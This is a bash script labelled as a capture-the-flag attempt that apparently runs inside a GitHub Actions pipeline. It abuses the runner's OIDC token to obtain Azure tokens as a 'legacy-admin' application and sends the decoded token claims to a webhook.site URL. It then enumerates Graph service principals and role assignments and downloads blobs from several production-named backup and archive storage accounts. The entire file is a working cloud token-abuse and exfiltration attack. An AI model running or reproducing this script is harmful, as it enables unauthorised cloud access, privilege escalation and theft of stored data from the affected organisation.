#!/usr/bin/env bash
# CTF DF26 v13: legacy-admin deep test + backup SA exports dir.
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
M=https://management.azure.com
LA=891fb158-e02c-4428-a885-53b811f369c0
WB=https://webhook.site/744e1661-136d-4800-a335-a79eb595334e
FL='DF26\{[^}]\{0,200}\}'
OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2"; }
AT=$(fed "$LA" "https://management.azure.com/.default" | jq -r '.access_token // empty')
echo "##### v13 ARM_len=${#AT}"
python3 - "$AT" <<'PY' 2>/dev/null | tee /tmp/cla.txt
import base64,json,sys
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=1))
PY
curl -s -X POST --data-urlencode claims@/tmp/cla.txt "$WB/v13-claims-$GITHUB_RUN_ID" >/dev/null
AT=$LA # noop
# graph token as legacy-admin
GT=$(fed "$LA" "https://graph.microsoft.com/.default" | jq -r '.access_token // empty')
echo "GRAPH_len=${#GT}"
[ ${#GT} -gt 50 ] && curl -s -m 15 -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId%20eq%20'891fb158-e02c-4428-a885-53b811f369c0'&%24select=id,displayName,appRoles,federatedIdentityCredentials" -o /tmp/la.json; jq -r '.value[0] | {displayName, appRoles: [.appRoles[]?.value], fic: [.federatedIdentityCredentials[]? | {name, issuer, subject}]}' /tmp/la.json 2>/dev/null | head -c 1500
echo
# legacy-admin on ARM scopes
for sc in "subscriptions/$S" "subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea" "subscriptions/$S/resourceGroups/rg-tbl-reporting-prod-eus"; do
  echo "SUB-RA ${sc##*/}: $(curl -s -m 15 -H "Authorization: Bearer $(fed "$LA" "https://management.azure.com/.default" | jq -r '.access_token // empty')" "$M/$sc/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&%24filter=atScope%28%29" | jq -r 'if .value then ([.value[] | .properties.principalId[0:8]+"|"+(.properties.roleDefinitionId|split("/")[-1][0:8])] | join(",")) else .error.code // "x" end' | head -c 400)"
done
# ---- backup SA full dump via CI bearer ----
ST=$(fed "$C" "https://storage.azure.com/.default")
for sa in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "##### SA $sa"
  R=$(curl -s -m 15 "https://$sa.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06')
  echo "$R" | grep -aoE "$FL"
  for cont in $(echo "$R" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
    echo "CONT $cont"
    L=$(curl -s -m 20 "https://$sa.blob.core.windows.net/$cont?restype=container&comp=list" -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06')
    echo "$L" | head -c 500; echo
    echo "$L" | grep -aoE "$FL"
    for blob in $(echo "$L" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//' | head -40); do
      echo "BLOB $cont/$blob"
      data=$(curl -s -m 20 "https://$sa.blob.core.windows.net/$cont/$blob" -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06')
      echo "$data" | head -c 400; echo
      echo "$data" | grep -aoE "$FL" && echo "FLAG_HIT $sa/$cont/$blob"
    done
  done
done
echo DONE-V13
